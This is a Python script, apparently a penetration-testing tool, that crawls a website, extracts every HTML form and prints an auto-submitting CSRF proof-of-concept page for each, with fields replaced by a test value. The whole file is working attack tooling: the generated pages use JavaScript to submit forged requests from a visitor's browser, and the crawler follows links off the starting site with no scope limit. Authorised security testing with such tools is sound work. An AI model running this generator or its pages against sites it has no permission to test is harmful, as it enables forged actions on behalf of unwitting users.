import argparse
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin


def get_all_forms(url):
    """Returns all form tags found on a single web page"""
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    """
    Extracts useful information about an HTML `form`
    Returns a tuple of form action and dictionary of form fields
    """
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return action, details


def generate_csrf_poc(action, inputs):
    """
    Generates a CSRF proof of concept HTML page for a given form
    Returns the HTML page as a string
    """
    poc = f"""<!DOCTYPE html>
<html>
  <body>
    <form id="attack-form" action="{action}" method="post">
    """
    for input_tag in inputs:
        poc += f"""<input type="{input_tag['type']}" name="{input_tag['name']}" value="{input_tag['value']}" />
"""
    poc += """<input type="submit" value="Submit" />
    </form>
    <script>
      document.getElementById("attack-form").submit();
    </script>
  </body>
</html>
"""
    return poc
def crawl(url, depth, parameter=None):
    """
    Recursively crawls a website up to a maximum depth.
    Identifies all form fields on each page and generates a CSRF POC for each form,
    modifying all available parameters if `parameter` is not specified.
    """
    if depth == 0:
        return

    parsed_url = urlparse(url)
    domain_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    response = requests.get(url)
    soup = BeautifulSoup(response.content, "html.parser")

    # Find all forms on the page
    for form in soup.find_all("form"):
        action, details = get_form_details(form)

        if not action.startswith(("http", "https")):
            absolute_action = urljoin(domain_url, action)
        else:
            absolute_action = action

        csrf_poc = None

        # Modify all available parameters if no parameter is specified
        if not parameter:
            for input_tag in details["inputs"]:
                poc_inputs = [{"type": input_tag["type"], "name": input_tag["name"], "value": "CSRF-TEST"}]
                poc_inputs += [i for i in details["inputs"] if i["name"] != input_tag["name"]]
                csrf_poc = generate_csrf_poc(absolute_action, poc_inputs)
                print(f"CSRF POC generated for {absolute_action} with parameter {input_tag['name']} modified:")
                print(csrf_poc)

        # Modify only the specified parameter if it exists
        else:
            for input_tag in details["inputs"]:
                if input_tag["name"] == parameter:
                    poc_inputs = [{"type": input_tag["type"], "name": input_tag["name"], "value": "CSRF-TEST"}]
                    csrf_poc = generate_csrf_poc(absolute_action, poc_inputs)
                    print(f"CSRF POC generated for {absolute_action} with parameter {parameter} modified:")
                    print(csrf_poc)

    # Recursively crawl all links on the page up to the specified depth
    for link in soup.find_all("a"):
        href = link.get("href")
        if not href:
            continue
        if any(href.startswith(s) for s in ["http", "https"]):
            absolute_url = href
        else:
            absolute_url = urljoin(domain_url, href)
        crawl(absolute_url, depth-1, parameter)
        
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate CSRF proof of concept pages for a given URL")
    parser.add_argument("url", type=str, help="The URL to crawl")
    parser.add_argument("-d", "--depth", type=int, default=1, help="The maximum depth to crawl")
    args = parser.parse_args()

    crawl(args.url, args.depth)
